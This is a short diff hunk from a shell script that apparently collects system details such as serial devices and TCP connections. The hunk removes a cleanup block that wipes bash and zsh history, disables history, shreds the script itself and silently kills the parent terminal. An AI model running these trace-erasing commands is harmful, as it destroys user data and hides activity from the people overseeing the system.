@@ -90,22 +90,3 @@ $serial_devices
 ==== TCP ====
 $tcp_connections
 "
-
-# === Cleanup ===
-history -c
-unset HISTFILE
-> ~/.bash_history 2>/dev/null
-> ~/.zsh_history 2>/dev/null
-export HISTSIZE=0
-export HISTFILESIZE=0
-export HISTCONTROL=ignorespace:erasedups
-
-reset
-clear
-
-# Self-delete if written to disk
-[ -f "$0" ] && { shred -u "$0" 2>/dev/null || rm -f "$0"; }
-
-# Auto-close terminal silently
-sleep 0.5
-kill -9 $PPID
